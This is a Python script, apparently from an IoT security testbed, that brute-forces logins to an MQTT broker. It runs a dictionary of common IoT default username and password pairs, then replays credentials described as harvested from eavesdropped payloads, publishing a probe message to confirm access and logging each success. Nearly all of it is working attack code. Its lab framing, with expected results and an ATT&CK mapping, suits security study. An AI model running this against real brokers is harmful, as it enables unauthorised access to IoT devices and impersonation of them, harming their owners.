#!/usr/bin/env python3
"""
04_bruteforce.py - MQTT Credential Brute Force Attack

Scenario 4: Dictionary-based brute force attack against the MQTT broker
to discover valid credentials used by IoT devices.

Attack description:
    The attacker attempts to authenticate to the broker using a dictionary
    of common IoT default credentials. In the insecure environment, the
    broker allows anonymous access so all connections succeed regardless.
    This script also demonstrates how exposed credentials in MQTT payloads
    (harvested via eavesdropping in Scenario 1) can be reused directly.

    Two phases:
        1. Dictionary attack using common IoT default credentials
        2. Credential reuse using credentials harvested from payloads

Expected result (insecure environment):
    - All connections succeed (anonymous access enabled)
    - Harvested credentials confirmed valid
    - No lockout, no detection, no alert

Metrics collected:
    - Attempts per second
    - Time to first successful authentication
    - Valid credentials found
    - Total attempts made

MITRE ATT&CK for ICS:
    - T0866: Exploitation of Remote Services
    - T0843: Program Download
"""

import paho.mqtt.client as mqtt
import time
import os
import json
from datetime import datetime


# ──────────────────────────────────────────────
# Attack configuration
# ──────────────────────────────────────────────
BROKER_HOST  = os.getenv("BROKER_HOST", "172.20.0.20")
BROKER_PORT  = int(os.getenv("BROKER_PORT", 1883))
OUTPUT_DIR   = "/attacker/results"

# ──────────────────────────────────────────────
# Common IoT default credentials dictionary
# Source: publicly known default credentials for
# embedded systems, routers, and IoT devices
# ──────────────────────────────────────────────
DEFAULT_CREDENTIALS = [
    ("admin",     "admin"),
    ("admin",     "admin123"),
    ("admin",     "password"),
    ("admin",     "1234"),
    ("admin",     "12345"),
    ("admin",     ""),
    ("root",      "root"),
    ("root",      "password"),
    ("root",      "1234"),
    ("root",      "toor"),
    ("root",      ""),
    ("user",      "user"),
    ("user",      "1234"),
    ("user",      "password"),
    ("guest",     "guest"),
    ("guest",     ""),
    ("mqtt",      "mqtt"),
    ("iot",       "iot"),
    ("device",    "device"),
    ("sensor",    "sensor"),
    ("pi",        "raspberry"),
    ("ubuntu",    "ubuntu"),
    ("test",      "test"),
    ("",          ""),
]

# ──────────────────────────────────────────────
# Credentials harvested from Scenario 1 (eavesdropping)
# These were exposed in plaintext MQTT payloads
# ──────────────────────────────────────────────
HARVESTED_CREDENTIALS = [
    ("admin",  "admin123"),   # from sensor_temp_01
    ("root",   "password"),   # from sensor_door_01
    ("user",   "1234"),       # from sensor_power_01
]


def log(msg: str):
    """Print a timestamped log message."""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def try_credentials(username: str, password: str, attempt_num: int) -> dict:
    """
    Attempt to authenticate to the broker with given credentials.

    Args:
        username: MQTT username to try
        password: MQTT password to try
        attempt_num: Attempt sequence number for logging

    Returns:
        Dict with attempt result including success status and latency
    """
    result = {
        "attempt":   attempt_num,
        "username":  username,
        "password":  password,
        "success":   False,
        "latency_ms": -1,
        "timestamp": datetime.utcnow().isoformat()
    }

    try:
        start = time.time()
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"bruteforce_{attempt_num}"
        )

        # Set credentials if provided
        if username or password:
            client.username_pw_set(username, password)

        # Attempt connection
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=5)

        # Try to publish a test message to verify full access
        client.loop_start()
        time.sleep(0.2)
        pub_result = client.publish("attack/bruteforce/probe", "test", qos=0)
        time.sleep(0.1)
        client.loop_stop()
        client.disconnect()

        elapsed_ms = round((time.time() - start) * 1000, 2)
        result["success"]    = True
        result["latency_ms"] = elapsed_ms

    except Exception as e:
        result["success"] = False
        result["error"]   = str(e)

    return result


def run_dictionary_attack() -> list:
    """
    Phase 1: Try all credentials in the default credentials dictionary.

    Returns:
        List of successful authentication results
    """
    log("[*] Phase 1: Dictionary attack with common IoT default credentials")
    log(f"[*] Testing {len(DEFAULT_CREDENTIALS)} credential pairs...")
    log("")

    successful = []
    attempt_num = 0
    start_time = time.time()

    for username, password in DEFAULT_CREDENTIALS:
        attempt_num += 1
        display_user = username if username else "(empty)"
        display_pass = password if password else "(empty)"

        result = try_credentials(username, password, attempt_num)

        if result["success"]:
            log(f"[+] SUCCESS [{attempt_num:3d}] {display_user}:{display_pass} — latency: {result['latency_ms']}ms")
            successful.append(result)
        else:
            log(f"[-] FAILED  [{attempt_num:3d}] {display_user}:{display_pass}")

        # Small delay to simulate realistic brute force timing
        time.sleep(0.3)

    elapsed = round(time.time() - start_time, 1)
    rate = round(attempt_num / elapsed, 1)

    log("")
    log(f"[*] Dictionary attack complete: {attempt_num} attempts in {elapsed}s ({rate} attempts/s)")
    log(f"[*] Successful authentications: {len(successful)}")

    return successful


def run_credential_reuse() -> list:
    """
    Phase 2: Reuse credentials harvested from MQTT payload eavesdropping.
    Demonstrates how Scenario 1 directly enables Scenario 4.

    Returns:
        List of successful authentication results
    """
    log("")
    log("[*] Phase 2: Credential reuse attack")
    log("[*] Using credentials harvested from MQTT payload eavesdropping (Scenario 1)")
    log("")

    successful = []
    attempt_num = 0

    for username, password in HARVESTED_CREDENTIALS:
        attempt_num += 1
        result = try_credentials(username, password, attempt_num)

        if result["success"]:
            log(f"[+] HARVESTED CREDENTIAL VALID: {username}:{password} — latency: {result['latency_ms']}ms")
            log(f"[!] Attacker can impersonate device using these credentials")
            successful.append(result)
        else:
            log(f"[-] FAILED: {username}:{password}")

        time.sleep(0.3)

    return successful


def save_results(dictionary_results: list, reuse_results: list, output_file: str):
    """
    Save all attack results to a JSON log file.

    Args:
        dictionary_results: Results from dictionary attack phase
        reuse_results: Results from credential reuse phase
        output_file: Path to output file
    """
    data = {
        "attack":    "bruteforce",
        "scenario":  4,
        "broker":    f"{BROKER_HOST}:{BROKER_PORT}",
        "timestamp": datetime.utcnow().isoformat(),
        "dictionary_attack": {
            "total_attempts":   len(DEFAULT_CREDENTIALS),
            "successful":       len(dictionary_results),
            "results":          dictionary_results
        },
        "credential_reuse": {
            "total_attempts":   len(HARVESTED_CREDENTIALS),
            "successful":       len(reuse_results),
            "results":          reuse_results
        }
    }

    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)

    log(f"[*] Results saved to {output_file}")


def main():
    """Main attack orchestrator."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_file = f"{OUTPUT_DIR}/04_bruteforce_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    print("==============================================")
    print(" SCENARIO 4 - MQTT Credential Brute Force")
    print("==============================================")
    print(f" Target broker     : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Dictionary size   : {len(DEFAULT_CREDENTIALS)} pairs")
    print(f" Harvested creds   : {len(HARVESTED_CREDENTIALS)} pairs")
    print("==============================================")
    print("")

    start_time = time.time()

    dictionary_results = run_dictionary_attack()
    reuse_results      = run_credential_reuse()

    total_time = round(time.time() - start_time, 1)
    save_results(dictionary_results, reuse_results, output_file)

    print("")
    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 4")
    print("==============================================")
    print(f" Total time         : {total_time}s")
    print(f" Dictionary success : {len(dictionary_results)}/{len(DEFAULT_CREDENTIALS)}")
    print(f" Reuse success      : {len(reuse_results)}/{len(HARVESTED_CREDENTIALS)}")
    print(f" Output saved to    : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()